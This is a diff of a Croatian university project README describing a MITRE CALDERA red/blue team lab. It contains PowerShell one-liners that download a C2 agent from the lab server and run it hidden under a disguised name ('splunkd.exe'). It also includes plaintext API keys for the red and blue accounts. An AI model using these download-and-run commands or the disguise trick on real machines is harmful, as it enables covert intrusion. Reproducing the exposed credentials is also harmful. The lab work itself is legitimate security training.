@@ -1,72 +1,98 @@
 # Adversary Simulation with MITRE CALDERA
 
-## Overview
-This project was developed as part of the course  
-**Information Systems Security (Sigurnost Informacijskih Sustava – SIS)**  
-at the **Faculty of Organization and Informatics (FOI)**.
+**Sveučilište u Zagrebu**
+**Fakultet organizacije i informatike** </br>
+**Kolegij:** Sigurnost informacijskih sustava  
+**Mentor:** Izv. prof. dr. sc. Igor Tomičić  
+**Studenti:** Mateo Čuvalo, Niko Ivančić, Nikola Lazar, Roberto Šandro  
 
-The goal of the project is to design and execute a simulated cyberattack
-on a mock corporate network using **MITRE CALDERA**.
-The project includes infrastructure design, adversary emulation,
-deployment of defensive controls, and evaluation of detection effectiveness
-based on the **MITRE ATT&CK framework**.
+---
 
-## Objectives
-- Gain hands-on experience with adversary emulation and red/blue team workflows
-- Design and secure a realistic enterprise network
-- Execute CALDERA attack techniques mapped to MITRE ATT&CK
-- Evaluate the effectiveness of security controls
-- Develop technical documentation and incident analysis skills
+## O projektu
+Ovaj repozitorij sadrži dokumentaciju i resurse za projekt simulacije napada i obrane koristeći platformu **MITRE Caldera**. Cilj projekta je demonstrirati automatizaciju "Red Team" aktivnosti (napada) i "Blue Team" aktivnosti (detekcije) u kontroliranom virtualnom okruženju.
 
-## Project Deliverables
-- Setup Guide (VM and network architecture, configuration)
-- Attack–Defense Matrix (ATT&CK techniques vs detection)
-- Incident Timeline with supporting evidence
-- Final Security Report
-- Demonstration of one attack and its detection/mitigation
+## Arhitektura sustava
 
-## Infrastructure Overview
-The simulated company network consists of:
+Sustav se sastoji od dva virtualna stroja unutar izolirane **NAT Network** mreže (`10.0.2.0/24`) hostane na Oracle VirtualBoxu:
 
-- Windows Server (Domain Controller)
-- Windows 10 Enterprise (Domain-joined workstation)
-- Linux Server (Web / SSH service)
-- Linux attacker machine running MITRE CALDERA
+1.  **Napadač (Red Team / C2 Server):**
+    * OS: Ubuntu Linux 24.04
+    * IP: `10.0.2.4` (primjer)
+    * Uloga: Vrti MITRE Caldera server u Docker kontejneru.
+2.  **Meta (Victim / Blue Team):**
+    * OS: Windows Server 2022
+    * Uloga: Zaraženo računalo na kojem se izvršavaju agenti i prate logovi (Sysmon).
 
-All machines are connected through an isolated **NAT Network** to ensure internal communication with internet access.
+---
 
-## Virtual Machines
-| Machine | OS | Role |
-|------|----|----|
-| DC | Windows Server 2019/2022 | Active Directory Domain Controller |
-| WS | Windows 10 Enterprise | Employee workstation |
-| Linux | Ubuntu Server | Internal Linux server |
-| Attacker | Kali Linux / Ubuntu | MITRE CALDERA server |
+## Postavljanje i Pokretanje (Setup)
 
-## Technologies Used
-- VirtualBox
-- MITRE CALDERA
-- Windows Active Directory
-- Ubuntu Server
-- MITRE ATT&CK Framework
+### 1. Preuzimanje potrebnih ISO slika
+* **Ubuntu Desktop 24.04 LTS:** [Download Link](https://ubuntu.com/download/desktop/thank-you?version=24.04.3&architecture=amd64&lts=true)
+* **Windows Server 2022:** [Download Link (Microsoft)](https://go.microsoft.com/fwlink/p/?LinkID=2195280&clcid=0x409&culture=en-us&country=US)
 
-## Documentation
-Detailed setup instructions and analysis can be found in the `/docs` directory.
+### 2. Pokretanje Caldere (Linux Terminal)
+Nakon instalacije Dockera na Linux stroju, Caldera se pokreće sljedećim naredbama:
 
-## Team
-- **Mateo Čuvalo** – Infrastructure Engineer  
-  Responsible for designing and configuring the virtualized enterprise network and core services.
+```bash
+cd caldera
+sudo docker start caldera-caldera-1
+```
+## 3. Pristup sučelju (Web Interface)
 
-- **Niko Ivančić** – Blue Team (Defense)  
-  Focused on defensive strategies, monitoring, and detection of adversary activities.
+Nakon pokretanja servera, sučelju se pristupa putem browsera.
 
-- **Nikola Lazar** – Red Team (Adversary Simulation)  
-  Responsible for executing attack scenarios and adversary simulations using MITRE CALDERA.
+* **Za Red Team (na Linuxu):** `http://localhost:8888`
+* **Za Blue Team (na Windowsu):** `http://10.0.2.4:8888`
+    > **Napomena:** Koristiti IP adresu Linux stroja.
 
-- **Roberto Šandro** – Threat Hunter Analyst  
-  Analyzed attack behavior, identified indicators of compromise, and mapped findings to the MITRE ATT&CK framework.
+### Podaci za prijavu
 
+| Team | Korisničko ime | API Key / Lozinka |
+| :--- | :--- | :--- |
+| **Red** | `red` | `f6u75jaE4tgJevBvJBWC4lUc02sMH9QWcI7_cwPHyIU` |
+| **Blue** | `blue` | `wgPTqLkrtw3ljJj5wWhalh3SiswlbK5cUOTvjmOs3-M` |
 
-## Disclaimer
-This project is for **educational purposes only**.
+---
 
+## 🕵️‍♂️ Kreiranje Agenata
+
+Agenti se instaliraju na **Windows Server** (žrtvu) putem PowerShell-a.
+**Važno:** Potrebno je otvoriti PowerShell kao **Administrator** i izvršiti odgovarajuću skriptu.
+
+### 🔴 Red Agent (Sandcat - splunkd.exe)
+Ovaj agent simulira napadača. Skriva se pod imenom `splunkd.exe` kako bi zavarao administratore.
+
+```powershell
+$server="[http://10.0.2.15:8888](http://10.0.2.15:8888)";
+$url="$server/file/download";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add("platform","windows");
+$wc.Headers.add("file","sandcat.go");
+$data=$wc.DownloadData($url);
+get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;
+rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
+[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
+Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+```
+
+## 🔵 Blue Agent (Defender - blue_agent.exe)
+
+Ovaj agent služi za **Blue Team** simulacije i odgovor na incidente. Dizajniran je za tihu instalaciju i komunikaciju s C2 serverom.
+
+### 📥 Instalacija i Pokretanje
+
+Kopirajte i pokrenite sljedeću naredbu u **PowerShell** terminalu (preporučuje se *Run as Administrator*):
+
+```powershell
+$server="[http://10.0.2.15:8888](http://10.0.2.15:8888)";
+$url="$server/file/download";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add("platform","windows");
+$wc.Headers.add("file","sandcat.go");
+$data=$wc.DownloadData($url);
+get-process | ? {$_.modules.filename -like "C:\Users\Public\blue_agent.exe"} | stop-process -f;
+rm -force "C:\Users\Public\blue_agent.exe" -ea ignore;
+[io.file]::WriteAllBytes("C:\Users\Public\blue_agent.exe",$data) | Out-Null;
+Start-Process -FilePath C:\Users\Public\blue_agent.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;
+```
